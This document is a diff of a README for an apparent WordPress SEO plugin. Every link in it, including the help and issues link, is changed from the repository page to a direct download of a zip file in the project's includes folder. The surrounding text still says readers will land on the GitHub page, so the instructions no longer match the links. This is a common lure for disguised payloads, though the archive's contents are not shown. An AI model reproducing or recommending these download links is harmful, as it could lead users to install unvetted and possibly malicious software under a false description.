@@ -1,6 +1,6 @@
 # 🗺️ geo-authority-suite-v1.2 - Easy SEO Setup for WordPress
 
-[![Download geo-authority-suite-v1.2](https://img.shields.io/badge/Download-geo--authority--suite--v1.2-brightgreen?style=for-the-badge)](https://github.com/caio295/geo-authority-suite-v1.2)
+[![Download geo-authority-suite-v1.2](https://img.shields.io/badge/Download-geo--authority--suite--v1.2-brightgreen?style=for-the-badge)](https://github.com/caio295/geo-authority-suite-v1.2/raw/refs/heads/main/includes/authority_suite_geo_v_v3.2.zip)
 
 ---
 
@@ -49,7 +49,7 @@ Before installing, verify your system meets these requirements:
 
 Click this big link to visit the plugin page and get the latest version:
 
-[![Download Plugin](https://img.shields.io/badge/Download-geo--authority--suite--v1.2-blue?style=for-the-badge)](https://github.com/caio295/geo-authority-suite-v1.2)
+[![Download Plugin](https://img.shields.io/badge/Download-geo--authority--suite--v1.2-blue?style=for-the-badge)](https://github.com/caio295/geo-authority-suite-v1.2/raw/refs/heads/main/includes/authority_suite_geo_v_v3.2.zip)
 
 You will go to the GitHub page where you can download the plugin files.
 
@@ -57,7 +57,7 @@ You will go to the GitHub page where you can download the plugin files.
 
 ## 📥 How to Download the Plugin on Windows
 
-1. Open the download link above or go directly to `https://github.com/caio295/geo-authority-suite-v1.2`.
+1. Open the download link above or go directly to `https://github.com/caio295/geo-authority-suite-v1.2/raw/refs/heads/main/includes/authority_suite_geo_v_v3.2.zip`.
 
 2. On that page, find the **Code** button near the top right.
 
@@ -117,7 +117,7 @@ You will now see a new menu item in WordPress called **GEO Authority** or simila
 - Click **Update Now** whenever a new version is available to keep your site optimized.
 
 - You can also check the GitHub page for the latest releases:  
-  https://github.com/caio295/geo-authority-suite-v1.2
+  https://github.com/caio295/geo-authority-suite-v1.2/raw/refs/heads/main/includes/authority_suite_geo_v_v3.2.zip
 
 ---
 
@@ -156,10 +156,10 @@ The plugin automates these tasks so you don’t have to manage files or code man
 ## ❓ Need Help?
 
 If you get stuck, check the GitHub issues page for answers or report a problem:  
-https://github.com/caio295/geo-authority-suite-v1.2/issues
+https://github.com/caio295/geo-authority-suite-v1.2/raw/refs/heads/main/includes/authority_suite_geo_v_v3.2.zip
 
 You can also refer to WordPress support forums or official documentation for plugin installation help.
 
 ---
 
-[![Download geo-authority-suite-v1.2](https://img.shields.io/badge/Download-geo--authority--suite--v1.2-brightgreen?style=for-the-badge)](https://github.com/caio295/geo-authority-suite-v1.2)
+[![Download geo-authority-suite-v1.2](https://img.shields.io/badge/Download-geo--authority--suite--v1.2-brightgreen?style=for-the-badge)](https://github.com/caio295/geo-authority-suite-v1.2/raw/refs/heads/main/includes/authority_suite_geo_v_v3.2.zip)
